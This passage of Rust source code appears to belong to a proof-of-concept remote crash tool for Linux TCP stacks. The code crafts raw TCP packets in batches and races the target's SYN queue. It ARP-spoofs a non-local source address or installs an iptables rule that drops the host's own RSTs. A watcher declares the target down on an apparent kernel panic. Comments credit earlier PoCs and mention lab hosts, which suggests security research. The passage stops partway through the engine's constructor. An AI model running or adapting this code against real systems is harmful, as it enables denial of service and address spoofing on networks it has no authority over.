#[cfg(target_os = "linux")]
mod platform {
    use crate::packets::{
        default_split, ipv4_packet, tcp_packet, SegmentSpec, FLAG_ACK, FLAG_FIN, FLAG_RST,
        FLAG_SYN, PROBE_PAYLOAD_LEN, PROBE_SPLITS,
    };
    use crate::{Config, Mode};
    use std::collections::VecDeque;
    use std::ffi::{CStr, CString};
    use std::io;
    use std::mem;
    use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, UdpSocket};
    use std::os::fd::RawFd;
    use std::process::Command;
    use std::ptr;
    use std::sync::atomic::{AtomicBool, AtomicU16, AtomicU32, AtomicU64, Ordering};
    use std::sync::Arc;
    use std::thread::{self, JoinHandle};
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

    /// Hard ceilings that keep a typo from asking the kernel for absurd work.
    const MAX_BACKLOG: usize = 4096;
    const MAX_BATCH: usize = 512;
    /// Packets per sendmmsg(): enough to amortize the syscall without
    /// building a huge iovec array per round.
    const SENDMMSG_CHUNK: usize = 64;

    static STOP: AtomicBool = AtomicBool::new(false);
    static TARGET_DOWN: AtomicBool = AtomicBool::new(false);

    extern "C" fn stop_signal(_: i32) {
        STOP.store(true, Ordering::Release);
    }

    pub fn target_down() -> bool {
        TARGET_DOWN.load(Ordering::Acquire)
    }

    fn unix_now() -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs()
    }

    fn pin_to(cpu: usize) {
        if cpu >= libc::CPU_SETSIZE as usize {
            return;
        }
        unsafe {
            let mut set: libc::cpu_set_t = mem::zeroed();
            libc::CPU_ZERO(&mut set);
            libc::CPU_SET(cpu, &mut set);
            if libc::sched_setaffinity(0, mem::size_of::<libc::cpu_set_t>(), &set) < 0 {
                eprintln!("[pin] cpu {cpu}: {}", io::Error::last_os_error());
            }
        }
    }

    fn cpu_count() -> usize {
        thread::available_parallelism()
            .map(|value| value.get())
            .unwrap_or(1)
    }

    #[derive(Default)]
    struct Stats {
        packets: u64,
        send_errors: u64,
        synacks: u64,
        cookies: u64,
        attempts: u64,
        rounds: u64,
        timeouts: u64,
        rst_leaks: u64,
    }

    /*
     * Classic-BPF receive filter: keep TCP segments whose source or destination
     * port is the target port, plus ARP when spoofing, VLAN frames and IP
     * fragments.  The authoritative parse and tuple checks live in
     * handle_frame(); this only cuts sniffer load on busy lab hosts.
     */
    fn filter_program(target_port: u16, allow_arp: bool) -> Vec<libc::sock_filter> {
        fn emit(code: &mut Vec<libc::sock_filter>, c: u16, jt: u8, jf: u8, k: u32) {
            code.push(libc::sock_filter { code: c, jt, jf, k });
        }
        let port = u32::from(target_port);
        let mut code: Vec<libc::sock_filter> = Vec::new();
        let ldh_abs = (libc::BPF_LD | libc::BPF_H | libc::BPF_ABS) as u16;
        let ldb_abs = (libc::BPF_LD | libc::BPF_B | libc::BPF_ABS) as u16;
        let ldh_ind = (libc::BPF_LD | libc::BPF_H | libc::BPF_IND) as u16;
        let ldx_msh = (libc::BPF_LDX | libc::BPF_B | libc::BPF_MSH) as u16;
        let jeq_k = (libc::BPF_JMP | libc::BPF_JEQ | libc::BPF_K) as u16;
        let jset_k = (libc::BPF_JMP | libc::BPF_JSET | libc::BPF_K) as u16;
        let ret_k = (libc::BPF_RET | libc::BPF_K) as u16;
        // Layout is fixed; jumps are resolved against the two final
        // instructions (DROP then PASS) below.
        // 0: ldh [12]
        emit(&mut code, ldh_abs, 0, 0, 12);
        let mut fixups: Vec<(usize, bool)> = Vec::new(); // (index, jump-if-true)
        if allow_arp {
            // jeq 0x0806 -> PASS
            fixups.push((code.len(), true));
            emit(&mut code, jeq_k, 0, 0, 0x0806);
        }
        // jeq 0x8100 -> PASS (VLAN: userspace handles the inner header)
        fixups.push((code.len(), true));
        emit(&mut code, jeq_k, 0, 0, 0x8100);
        // jne 0x0800 -> DROP
        fixups.push((code.len(), false));
        emit(&mut code, jeq_k, 0, 0, 0x0800);
        // ldb [23]; jne IPPROTO_TCP -> DROP
        emit(&mut code, ldb_abs, 0, 0, 23);
        fixups.push((code.len(), false));
        emit(&mut code, jeq_k, 0, 0, u32::from(libc::IPPROTO_TCP as u8));
        // ldh [20]; jset 0x1fff -> PASS (fragments)
        emit(&mut code, ldh_abs, 0, 0, 20);
        fixups.push((code.len(), true));
        emit(&mut code, jset_k, 0, 0, 0x1fff);
        // ldx msh [14]; ldh [x+14]; jeq port -> PASS; ldh [x+16]; jeq port -> PASS
        // X is the IP header length, so the TCP source/destination ports sit at
        // frame offsets X+14 and X+16.
        emit(&mut code, ldx_msh, 0, 0, 14);
        emit(&mut code, ldh_ind, 0, 0, 14);
        fixups.push((code.len(), true));
        emit(&mut code, jeq_k, 0, 0, port);
        emit(&mut code, ldh_ind, 0, 0, 16);
        fixups.push((code.len(), true));
        emit(&mut code, jeq_k, 0, 0, port);
        // DROP must precede PASS: if the final port comparison falls through,
        // the packet is not ours.
        let drop_index = code.len();
        emit(&mut code, ret_k, 0, 0, 0); // DROP
        let pass_index = code.len();
        emit(&mut code, ret_k, 0, 0, 65_535); // PASS
        for (index, on_true) in fixups {
            let target = if on_true { pass_index } else { drop_index };
            let offset = (target - index - 1) as u8;
            if on_true {
                code[index].jt = offset;
            } else {
                code[index].jf = offset;
            }
        }
        code
    }

    struct RawSocket {
        fd: RawFd,
    }

    unsafe impl Send for RawSocket {}
    unsafe impl Sync for RawSocket {}

    impl RawSocket {
        fn open(domain: i32, socket_type: i32, protocol: i32) -> io::Result<Self> {
            let fd = unsafe { libc::socket(domain, socket_type, protocol) };
            if fd < 0 {
                return Err(raw_socket_error());
            }
            Ok(Self { fd })
        }

        fn sender(mark: u32, interface: &str) -> io::Result<Self> {
            let socket = Self::open(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW)?;
            let enabled: i32 = 1;
            let result = unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::IPPROTO_IP,
                    libc::IP_HDRINCL,
                    &enabled as *const i32 as *const libc::c_void,
                    mem::size_of_val(&enabled) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            if mark != 0 {
                let result = unsafe {
                    libc::setsockopt(
                        socket.fd,
                        libc::SOL_SOCKET,
                        libc::SO_MARK,
                        &mark as *const u32 as *const libc::c_void,
                        mem::size_of_val(&mark) as libc::socklen_t,
                    )
                };
                if result < 0 {
                    return Err(io::Error::last_os_error());
                }
            }
            // Pin TX to the same device the sniffer watches. Without this a
            // multi-homed host can route crafted packets out of a different
            // interface than the one ARP-spoofed and sniffed, which silently
            // breaks both the capture and the RST-leak check.
            if !interface.is_empty() {
                let name = CString::new(interface).map_err(|_| {
                    invalid_input("the network interface name contains an unexpected NUL byte")
                })?;
                let result = unsafe {
                    libc::setsockopt(
                        socket.fd,
                        libc::SOL_SOCKET,
                        libc::SO_BINDTODEVICE,
                        name.as_ptr() as *const libc::c_void,
                        name.as_bytes().len() as libc::socklen_t + 1,
                    )
                };
                if result < 0 {
                    return Err(io::Error::last_os_error());
                }
            }
            Ok(socket)
        }

        fn packet_receiver(interface_index: i32) -> io::Result<Self> {
            let protocol = (libc::ETH_P_ALL as u16).to_be() as i32;
            let socket = Self::open(libc::AF_PACKET, libc::SOCK_RAW, protocol)?;
            let receive_buffer: i32 = 16 * 1024 * 1024;
            unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::SOL_SOCKET,
                    libc::SO_RCVBUF,
                    &receive_buffer as *const i32 as *const libc::c_void,
                    mem::size_of_val(&receive_buffer) as libc::socklen_t,
                );
            }
            let timeout = libc::timeval {
                tv_sec: 0,
                tv_usec: 100_000,
            };
            let result = unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::SOL_SOCKET,
                    libc::SO_RCVTIMEO,
                    &timeout as *const libc::timeval as *const libc::c_void,
                    mem::size_of_val(&timeout) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            let address = libc::sockaddr_ll {
                sll_family: libc::AF_PACKET as u16,
                sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
                sll_ifindex: interface_index,
                sll_hatype: 0,
                sll_pkttype: 0,
                sll_halen: 0,
                sll_addr: [0; 8],
            };
            let result = unsafe {
                libc::bind(
                    socket.fd,
                    &address as *const libc::sockaddr_ll as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            Ok(socket)
        }

        /*
         * Attach the filter built by filter_program().  Failure is not fatal:
         * the sniffer then receives every frame and handle_frame filters them.
         */
        fn attach_filter(&self, target_port: u16, allow_arp: bool) {
            let code = filter_program(target_port, allow_arp);
            let program = libc::sock_fprog {
                len: code.len() as u16,
                filter: code.as_ptr() as *mut libc::sock_filter,
            };
            let result = unsafe {
                libc::setsockopt(
                    self.fd,
                    libc::SOL_SOCKET,
                    libc::SO_ATTACH_FILTER,
                    &program as *const libc::sock_fprog as *const libc::c_void,
                    mem::size_of_val(&program) as libc::socklen_t,
                )
            };
            if result < 0 {
                eprintln!(
                    "[*] BPF receive filter not attached: {} (continuing unfiltered)",
                    io::Error::last_os_error()
                );
            }
        }

        fn send(&self, packet: &[u8], target: Ipv4Addr) -> io::Result<()> {
            let address = socket_address(target, 0);
            let sent = unsafe {
                libc::sendto(
                    self.fd,
                    packet.as_ptr() as *const libc::c_void,
                    packet.len(),
                    0,
                    &address as *const libc::sockaddr_in as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if sent < 0 {
                Err(io::Error::last_os_error())
            } else if sent as usize == packet.len() {
                Ok(())
            } else {
                Err(io::Error::new(
                    io::ErrorKind::WriteZero,
                    "raw socket sent a partial packet",
                ))
            }
        }

        /*
         * sendmmsg batching (from nsvk13's engine): one syscall per group of
         * packets instead of one per packet. Tightens the on-wire packet
         * trains and removes syscall overhead from the fill/harvest phases.
         * Returns (sent, failed); sendmmsg stops at the first error.
         */
        fn send_batch(&self, packets: &[Vec<u8>], target: Ipv4Addr) -> (usize, usize) {
            let address = socket_address(target, 0);
            let mut sent_total = 0usize;
            let mut failed_total = 0usize;
            for chunk in packets.chunks(SENDMMSG_CHUNK) {
                let mut iovs: Vec<libc::iovec> = chunk
                    .iter()
                    .map(|packet| libc::iovec {
                        iov_base: packet.as_ptr() as *mut libc::c_void,
                        iov_len: packet.len(),
                    })
                    .collect();
                let mut messages: Vec<libc::mmsghdr> = iovs
                    .iter_mut()
                    .map(|iov| {
                        let mut message: libc::mmsghdr = unsafe { mem::zeroed() };
                        message.msg_hdr.msg_iov = iov;
                        message.msg_hdr.msg_iovlen = 1;
                        message.msg_hdr.msg_name =
                            &address as *const libc::sockaddr_in as *mut libc::c_void;
                        message.msg_hdr.msg_namelen = mem::size_of_val(&address) as libc::socklen_t;
                        message
                    })
                    .collect();
                let sent = unsafe {
                    libc::sendmmsg(
                        self.fd,
                        messages.as_mut_ptr(),
                        chunk.len() as libc::c_uint,
                        0,
                    )
                };
                if sent < 0 {
                    failed_total += chunk.len();
                } else {
                    sent_total += sent as usize;
                    failed_total += chunk.len() - sent as usize;
                }
            }
            (sent_total, failed_total)
        }

        fn send_frame(
            &self,
            frame: &[u8],
            interface_index: i32,
            protocol: u16,
            destination_mac: [u8; 6],
        ) -> io::Result<()> {
            let mut address: libc::sockaddr_ll = unsafe { mem::zeroed() };
            address.sll_family = libc::AF_PACKET as u16;
            address.sll_protocol = protocol.to_be();
            address.sll_ifindex = interface_index;
            address.sll_halen = 6;
            address.sll_addr[..6].copy_from_slice(&destination_mac);
            let sent = unsafe {
                libc::sendto(
                    self.fd,
                    frame.as_ptr() as *const libc::c_void,
                    frame.len(),
                    0,
                    &address as *const libc::sockaddr_ll as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if sent < 0 {
                Err(io::Error::last_os_error())
            } else {
                Ok(())
            }
        }

        fn receive_from(&self, buffer: &mut [u8]) -> io::Result<(usize, libc::sockaddr_ll)> {
            let mut address: libc::sockaddr_ll = unsafe { mem::zeroed() };
            let mut address_length = mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t;
            let received = unsafe {
                libc::recvfrom(
                    self.fd,
                    buffer.as_mut_ptr() as *mut libc::c_void,
                    buffer.len(),
                    0,
                    &mut address as *mut libc::sockaddr_ll as *mut libc::sockaddr,
                    &mut address_length,
                )
            };
            if received < 0 {
                Err(io::Error::last_os_error())
            } else {
                Ok((received as usize, address))
            }
        }
    }

    impl Drop for RawSocket {
        fn drop(&mut self) {
            unsafe {
                libc::close(self.fd);
            }
        }
    }

    struct OwnedFd(RawFd);

    impl Drop for OwnedFd {
        fn drop(&mut self) {
            unsafe {
                libc::close(self.0);
            }
        }
    }

    /*
     * A plain kernel TCP connect, used only by the liveness watcher. std has
     * no bind-before-connect for TcpStream, and the watcher must keep its
     * source port outside the engine's range so its handshake never shows up
     * in the per-port sniffer state. The socket is non-blocking, so the
     * timeout covers connect() itself, not just the handshake.
     */
    fn tcp_connect(
        source: Ipv4Addr,
        bind_port: Option<u16>,
        target: SocketAddr,
        timeout: Duration,
    ) -> io::Result<()> {
        let SocketAddr::V4(target) = target else {
            return Err(invalid_input("the watcher only supports IPv4 targets"));
        };
        let fd = unsafe {
            libc::socket(
                libc::AF_INET,
                libc::SOCK_STREAM | libc::SOCK_CLOEXEC | libc::SOCK_NONBLOCK,
                0,
            )
        };
        if fd < 0 {
            return Err(io::Error::last_os_error());
        }
        let fd = OwnedFd(fd);
        if let Some(port) = bind_port {
            let address = socket_address(source, port);
            let result = unsafe {
                libc::bind(
                    fd.0,
                    &address as *const libc::sockaddr_in as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if result < 0 {
                // A busy or foreign source port must not fake a DOWN verdict:
                // fall through and let the kernel pick an ephemeral one.
                return tcp_connect_unbound(fd, target, timeout);
            }
        }
        tcp_connect_unbound(fd, target, timeout)
    }

    fn tcp_connect_unbound(fd: OwnedFd, target: SocketAddrV4, timeout: Duration) -> io::Result<()> {
        let address = socket_address(*target.ip(), target.port());
        let result = unsafe {
            libc::connect(
                fd.0,
                &address as *const libc::sockaddr_in as *const libc::sockaddr,
                mem::size_of_val(&address) as libc::socklen_t,
            )
        };
        if result == 0 {
            return Ok(());
        }
        let error = io::Error::last_os_error();
        if error.raw_os_error() != Some(libc::EINPROGRESS) {
            return Err(error);
        }
        let mut poll_fd = libc::pollfd {
            fd: fd.0,
            events: libc::POLLOUT,
            revents: 0,
        };
        let milliseconds = timeout.as_millis().min(i32::MAX as u128) as i32;
        let ready = unsafe { libc::poll(&mut poll_fd, 1, milliseconds) };
        if ready == 0 {
            return Err(io::Error::new(io::ErrorKind::TimedOut, "connect timed out"));
        }
        if ready < 0 {
            return Err(io::Error::last_os_error());
        }
        let mut so_error: i32 = 0;
        let mut length = mem::size_of_val(&so_error) as libc::socklen_t;
        let result = unsafe {
            libc::getsockopt(
                fd.0,
                libc::SOL_SOCKET,
                libc::SO_ERROR,
                &mut so_error as *mut i32 as *mut libc::c_void,
                &mut length,
            )
        };
        if result < 0 {
            return Err(io::Error::last_os_error());
        }
        if so_error != 0 {
            return Err(io::Error::from_raw_os_error(so_error));
        }
        Ok(())
    }

    /*
     * The transmit side is either a real raw socket or an offline sink used
     * by --dry-run. The sink counts packets exactly like a successful send,
     * so the round logic can be exercised without root or a network.
     */
    enum Sender {
        Raw(RawSocket),
        Dry,
    }

    impl Sender {
        fn send(&self, packet: &[u8], target: Ipv4Addr) -> io::Result<()> {
            match self {
                Sender::Raw(socket) => socket.send(packet, target),
                Sender::Dry => Ok(()),
            }
        }

        fn send_batch(&self, packets: &[Vec<u8>], target: Ipv4Addr) -> (usize, usize) {
            match self {
                Sender::Raw(socket) => socket.send_batch(packets, target),
                Sender::Dry => (packets.len(), 0),
            }
        }
    }

    #[derive(Clone, Copy, Default)]
    struct Segment {
        flags: u8,
        sequence: u32,
        acknowledgment: u32,
    }

    struct SegmentState {
        counts: Vec<AtomicU64>,
        sequences: Vec<AtomicU32>,
        acknowledgments: Vec<AtomicU32>,
        flags: Vec<AtomicU32>,
        synacks: AtomicU64,
        watch_port: AtomicU16,
        rst_seen: AtomicBool,
    }

    impl SegmentState {
        fn new() -> Self {
            Self {
                counts: (0..65_536).map(|_| AtomicU64::new(0)).collect(),
                sequences: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                acknowledgments: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                flags: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                synacks: AtomicU64::new(0),
                watch_port: AtomicU16::new(0),
                rst_seen: AtomicBool::new(false),
            }
        }

        fn mark(&self, port: u16) -> u64 {
            self.counts[usize::from(port)].load(Ordering::Acquire)
        }

        fn read(&self, port: u16) -> (u64, Segment) {
            let index = usize::from(port);
            // Read the counter first: the sniffer stores the fields and then
            // publishes them with a release increment of the counter, so an
            // acquire load of the counter must happen before the field loads.
            let count = self.counts[index].load(Ordering::Acquire);
            let segment = Segment {
                flags: self.flags[index].load(Ordering::Relaxed) as u8,
                sequence: self.sequences[index].load(Ordering::Relaxed),
                acknowledgment: self.acknowledgments[index].load(Ordering::Relaxed),
            };
            (count, segment)
        }
    }

    /*
     * ARP context for --spoof (from re4's PoC): claim a non-local source
     * address on the target's L2 segment. SYN-ACKs are delivered to the
     * AF_PACKET sniffer, but the local IP stack does not own the address and
     * never generates RSTs — no iptables rule and no CAP_NET_ADMIN needed.
     */
    struct ArpContext {
        spoofed: Ipv4Addr,
        mac: [u8; 6],
        interface_index: i32,
    }

    impl ArpContext {
        fn reply(&self, request: &[u8], socket: &RawSocket) {
            // request points at the ARP payload (28 bytes)
            let mut frame = vec![0u8; 14 + 28];
            frame[0..6].copy_from_slice(&request[8..14]); // requester MAC
            frame[6..12].copy_from_slice(&self.mac);
            frame[12..14].copy_from_slice(&0x0806u16.to_be_bytes());
            let arp = &mut frame[14..];
            arp[0..2].copy_from_slice(&1u16.to_be_bytes()); // hardware: ethernet
            arp[2..4].copy_from_slice(&0x0800u16.to_be_bytes()); // protocol: IPv4
            arp[4] = 6;
            arp[5] = 4;
            arp[6..8].copy_from_slice(&2u16.to_be_bytes()); // opcode: reply
            arp[8..14].copy_from_slice(&self.mac);
            arp[14..18].copy_from_slice(&self.spoofed.octets());
            arp[18..24].copy_from_slice(&request[8..14]);
            arp[24..28].copy_from_slice(&request[14..18]);
            let mut destination = [0u8; 6];
            destination.copy_from_slice(&request[8..14]);
            let _ = socket.send_frame(
                &frame,
                self.interface_index,
                libc::ETH_P_ARP as u16,
                destination,
            );
        }

        fn announce(&self, socket: &RawSocket) {
            // gratuitous ARP request: who-has <spoofed> tell <spoofed>
            let mut frame = vec![0u8; 14 + 28];
            frame[0..6].copy_from_slice(&[0xff; 6]);
            frame[6..12].copy_from_slice(&self.mac);
            frame[12..14].copy_from_slice(&0x0806u16.to_be_bytes());
            let arp = &mut frame[14..];
            arp[0..2].copy_from_slice(&1u16.to_be_bytes());
            arp[2..4].copy_from_slice(&0x0800u16.to_be_bytes());
            arp[4] = 6;
            arp[5] = 4;
            arp[6..8].copy_from_slice(&1u16.to_be_bytes()); // opcode: request
            arp[8..14].copy_from_slice(&self.mac);
            arp[14..18].copy_from_slice(&self.spoofed.octets());
            // target hardware address left zero
            arp[24..28].copy_from_slice(&self.spoofed.octets());
            for _ in 0..3 {
                let _ = socket.send_frame(
                    &frame,
                    self.interface_index,
                    libc::ETH_P_ARP as u16,
                    [0xff; 6],
                );
                thread::sleep(Duration::from_millis(50));
            }
        }
    }

    struct Sniffer {
        state: Arc<SegmentState>,
        thread: Option<JoinHandle<()>>,
        dry: bool,
    }

    impl Sniffer {
        fn dry() -> Self {
            Self {
                state: Arc::new(SegmentState::new()),
                thread: None,
                dry: true,
            }
        }

        #[allow(clippy::too_many_arguments)]
        fn start(
            interface_index: i32,
            source: Ipv4Addr,
            target: Ipv4Addr,
            target_port: u16,
            source_port_low: u16,
            source_port_count: usize,
            debug: bool,
            arp: Option<ArpContext>,
            pin: bool,
        ) -> io::Result<Self> {
            let socket = Arc::new(RawSocket::packet_receiver(interface_index)?);
            socket.attach_filter(target_port, arp.is_some());
            let arp = arp.map(Arc::new);
            if let Some(context) = &arp {
                context.announce(&socket);
            }
            let state = Arc::new(SegmentState::new());
            let thread_socket = Arc::clone(&socket);
            let thread_state = Arc::clone(&state);
            let thread_arp = arp.clone();
            let cpus = cpu_count();
            let thread = thread::spawn(move || {
                if pin {
                    pin_to(1 % cpus);
                }
                let mut buffer = [0u8; 65_535];
                let mut frames = 0u64;
                while !STOP.load(Ordering::Acquire) {
                    match thread_socket.receive_from(&mut buffer) {
                        Ok((length, address)) => {
                            frames += 1;
                            handle_frame(
                                &buffer[..length],
                                &address,
                                source,
                                target,
                                target_port,
                                source_port_low,
                                source_port_count,
                                &thread_state,
                                thread_arp.as_deref(),
                                &thread_socket,
                                debug && frames <= 16,
                            );
                        }
                        Err(error)
                            if matches!(
                                error.kind(),
                                io::ErrorKind::WouldBlock
                                    | io::ErrorKind::TimedOut
                                    | io::ErrorKind::Interrupted
                            ) => {}
                        Err(_) => thread::sleep(Duration::from_millis(1)),
                    }
                }
            });
            Ok(Self {
                state,
                thread: Some(thread),
                dry: false,
            })
        }
    }

    impl Drop for Sniffer {
        fn drop(&mut self) {
            STOP.store(true, Ordering::Release);
            if let Some(thread) = self.thread.take() {
                let _ = thread.join();
            }
        }
    }

    #[allow(clippy::too_many_arguments)]
    fn handle_frame(
        frame: &[u8],
        address: &libc::sockaddr_ll,
        source: Ipv4Addr,
        target: Ipv4Addr,
        target_port: u16,
        source_port_low: u16,
        source_port_count: usize,
        state: &SegmentState,
        arp: Option<&ArpContext>,
        socket: &RawSocket,
        debug: bool,
    ) {
        if frame.len() < 14 {
            return;
        }
        let mut ethernet_type = u16::from_be_bytes([frame[12], frame[13]]);
        let mut offset = 14;
        if ethernet_type == 0x8100 && frame.len() >= 18 {
            ethernet_type = u16::from_be_bytes([frame[16], frame[17]]);
            offset = 18;
        }
        if ethernet_type == 0x0806 {
            if let Some(context) = arp {
                if address.sll_pkttype != libc::PACKET_OUTGOING && frame.len() >= offset + 28 {
                    let request = &frame[offset..offset + 28];
                    let opcode = u16::from_be_bytes([request[6], request[7]]);
                    if opcode == 1 && request[24..28] == context.spoofed.octets() {
                        context.reply(request, socket);
                    }
                }
            }
            return;
        }
        if ethernet_type != libc::ETH_P_IP as u16 || frame.len() < offset + 40 {
            return;
        }
        let ip = &frame[offset..];
        if ip[0] >> 4 != 4 || ip[9] != libc::IPPROTO_TCP as u8 {
            return;
        }
        let ip_header = usize::from(ip[0] & 0x0f) * 4;
        if ip_header < 20 || ip.len() < ip_header + 20 {
            return;
        }
        let fragment = u16::from_be_bytes([ip[6], ip[7]]);
        if fragment & 0x3fff != 0 {
            return;
        }
        let tcp = &ip[ip_header..];
        let source_address = &ip[12..16];
        let destination_address = &ip[16..20];
        let source_port = u16::from_be_bytes([tcp[0], tcp[1]]);
        let destination_port = u16::from_be_bytes([tcp[2], tcp[3]]);
        let flags = tcp[13];
        if debug {
            eprintln!(
                "[dbg] tcp {source_port}->{destination_port} flags=0x{flags:02x} out={}",
                address.sll_pkttype == libc::PACKET_OUTGOING
            );
        }
        if address.sll_pkttype == libc::PACKET_OUTGOING {
            let watch = state.watch_port.load(Ordering::Relaxed);
            if watch != 0
                && source_address == source.octets()
                && destination_address == target.octets()
                && source_port == watch
                && destination_port == target_port
                && flags & (FLAG_RST | FLAG_ACK) == FLAG_RST
            {
                state.rst_seen.store(true, Ordering::Release);
            }
            return;
        }
        if source_address != target.octets()
            || destination_address != source.octets()
            || source_port != target_port
        {
            return;
        }
        // Only track segments for ports the engine owns; this keeps the
        // liveness watcher's own connections out of the per-port state.
        let port_index = usize::from(destination_port);
        let low = usize::from(source_port_low);
        if port_index < low || port_index >= low + source_port_count {
            return;
        }
        let sequence = u32::from_be_bytes([tcp[4], tcp[5], tcp[6], tcp[7]]);
        let acknowledgment = u32::from_be_bytes([tcp[8], tcp[9], tcp[10], tcp[11]]);
        if flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK {
            state.synacks.fetch_add(1, Ordering::Relaxed);
        }
        state.sequences[port_index].store(sequence, Ordering::Relaxed);
        state.acknowledgments[port_index].store(acknowledgment, Ordering::Relaxed);
        state.flags[port_index].store(u32::from(flags), Ordering::Relaxed);
        state.counts[port_index].fetch_add(1, Ordering::Release);
    }

    /*
     * Built-in liveness watcher (idea from mustafasaydam's PoC, semantics
     * from nsvk13's lab/monitor.sh): a normal kernel TCP connect to the
     * target port every second. With syncookies active a live target keeps
     * answering even while the race saturates its SYN queue, so sustained
     * failures mean the host went down. Declares DOWN after four misses,
     * timestamps it and stops the run; exit code becomes 3.
     */
    struct Watcher {
        thread: Option<JoinHandle<()>>,
    }

    impl Watcher {
        fn start(config: &Config, source: Ipv4Addr) -> Self {
            let target = config.target;
            let port = config.port;
            let pin = config.pin;
            // Bind outside the engine's source-port range so the watcher's
            // own handshake never lands in a raced tuple's state slot.
            let bind_port = if config.source_port > 2048 {
                Some(config.source_port - 1)
            } else {
                let end = usize::from(config.source_port) + config.source_port_count;
                (end < 65_535).then_some(end as u16)
            };
            let cpus = cpu_count();
            let thread = thread::spawn(move || {
                if pin {
                    pin_to(cpus.saturating_sub(1));
                }
                let address = SocketAddr::from((target, port));
                let mut failures = 0u32;
                while !STOP.load(Ordering::Acquire) {
                    // A busy bind port falls back to an ephemeral one; only
                    // connect failures count toward the DOWN verdict.
                    let connected = tcp_connect(source, bind_port, address, Duration::from_secs(2));
                    if connected.is_ok() {
                        failures = 0;
                    } else {
                        failures += 1;
                        if failures >= 4 {
                            TARGET_DOWN.store(true, Ordering::Release);
                            println!(
                                "[watch] unix={} TARGET DOWN: no TCP answer for ~10 s — probable kernel panic; confirm via serial console/kmsg",
                                unix_now()
                            );
                            STOP.store(true, Ordering::Release);
                            return;
                        }
                    }
                    for _ in 0..10 {
                        if STOP.load(Ordering::Acquire) {
                            return;
                        }
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            });
            Self {
                thread: Some(thread),
            }
        }
    }

    impl Drop for Watcher {
        fn drop(&mut self) {
            if let Some(thread) = self.thread.take() {
                let _ = thread.join();
            }
        }
    }

    struct RstFilter {
        iptables: Option<std::path::PathBuf>,
        arguments: Vec<String>,
        installed: bool,
    }

    impl RstFilter {
        fn disabled() -> Self {
            Self {
                iptables: None,
                arguments: Vec::new(),
                installed: false,
            }
        }

        fn install(config: &Config) -> io::Result<Self> {
            if config.no_rst_filter || config.spoof {
                return Ok(Self::disabled());
            }
            if config.mark == 0 {
                return Err(invalid_input(
                    "the automatic RST filter requires a nonzero --mark",
                ));
            }
            let iptables = ["/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables"]
                .into_iter()
                .map(std::path::PathBuf::from)
                .find(|path| path.exists())
                .ok_or_else(|| {
                    io::Error::new(
                        io::ErrorKind::NotFound,
                        "iptables is required for automatic RST suppression; install it, use --no-rst-filter with an equivalent nftables rule, or use --spoof on an on-link segment",
                    )
                })?;
            let last_port = usize::from(config.source_port) + config.source_port_count - 1;
            let arguments = vec![
                "OUTPUT".into(),
                "-p".into(),
                "tcp".into(),
                "--sport".into(),
                format!("{}:{last_port}", config.source_port),
                "--tcp-flags".into(),
                "RST".into(),
                "RST".into(),
                "-m".into(),
                "mark".into(),
                "!".into(),
                "--mark".into(),
                format!("0x{:x}", config.mark),
                "-j".into(),
                "DROP".into(),
            ];
            let exists = Command::new(&iptables)
                .arg("-w")
                .arg("2")
                .arg("-C")
                .args(&arguments)
                .output()
                .map(|output| output.status.success())
                .unwrap_or(false);
            if exists {
                return Ok(Self {
                    iptables: Some(iptables),
                    arguments,
                    installed: false,
                });
            }
            let output = Command::new(&iptables)
                .arg("-w")
                .arg("2")
                .arg("-I")
                .args(&arguments)
                .output()?;
            if !output.status.success() {
                return Err(io::Error::other(format!(
                    "cannot install the OUTPUT RST filter: {}",
                    String::from_utf8_lossy(&output.stderr).trim()
                )));
            }
            println!("[*] temporary host-RST filter installed");
            Ok(Self {
                iptables: Some(iptables),
                arguments,
                installed: true,
            })
        }
    }

    impl Drop for RstFilter {
        fn drop(&mut self) {
            if self.installed {
                if let Some(iptables) = &self.iptables {
                    let _ = Command::new(iptables)
                        .arg("-w")
                        .arg("2")
                        .arg("-D")
                        .args(&self.arguments)
                        .status();
                }
            }
        }
    }

    #[derive(Clone, Copy)]
    struct JunkRequest {
        port: u16,
        sequence: u32,
    }

    #[derive(Clone, Copy, Default)]
    struct Target {
        port: u16,
        harvest_sequence: u32,
        request_sequence: u32,
        cookie: Option<u32>,
        mark: u64,
        packet_id: u16,
    }

    struct Engine {
        config: Config,
        source: Ipv4Addr,
        watch_source: Ipv4Addr,
        sender: Sender,
        sniffer: Sniffer,
        _filter: RstFilter,
        watch: Option<Watcher>,
        next_source_port: usize,
        packet_id: u16,
        random_state: u64,
        junk: VecDeque<JunkRequest>,
        previous: Vec<Target>,
        synack_timeout: Duration,
        calibrated_fill: usize,
        resolved_split: usize,
        stats: Stats,
    }

    impl Engine {
        fn new(
            config: Config,
            source: Ipv4Addr,
            sender: Sender,
            sniffer: Sniffer,
            filter: RstFilter,
        ) -> Self {
            let seed = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as u64
                ^ u64::from(std::process::id());
            let resolved_split = config
                .frag_split
                .unwrap_or_else(|| default_split(config.payload));
            Self {
                config,
                source,
                watch_source: source,
                sender,
                sniffer,
                _filter: filter,
                watch: None,
                next_source_port: 0,
                packet_id: (seed & 0xffff) as u16,
